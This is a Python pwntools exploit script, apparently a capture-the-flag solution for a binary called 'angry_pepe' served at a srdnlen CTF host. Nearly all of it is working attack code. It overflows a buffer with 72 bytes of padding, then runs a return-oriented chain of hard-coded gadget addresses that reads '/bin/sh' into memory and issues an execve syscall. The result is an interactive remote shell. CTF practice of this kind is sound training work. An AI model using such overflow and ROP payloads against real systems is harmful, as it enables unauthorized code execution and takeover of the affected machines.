#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
# context.log_level = 'error' # se non vuoi vedere i loggin
exe = context.binary = ELF(args.EXE or './angry_pepe')

host = args.HOST or 'angrypepe.chall.srdnlen.it'
port = int(args.PORT or 443)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port, ssl=True)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
b *0x4011f8
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

padding = b"A" * 72
syscall = p64(0x4011f8)
file = p64(0x404020)
rdi = p64(0x4011fb)
rdx = p64(0x4011fd)
rsi = p64(0x4011ff)
rax = p64(0x401201)
get = p64(0x4010a4)
exchange = p64(0x4011d3)

payload = flat(
    padding, rdi, file, get, rax, 59 ,rdi, file, rsi, 0, rdx, 0, syscall
)

io.sendlineafter(b"> ",payload)
io.sendline(b"/bin/sh")
# io.sendline()
# print(io.recvline())

io.interactive()

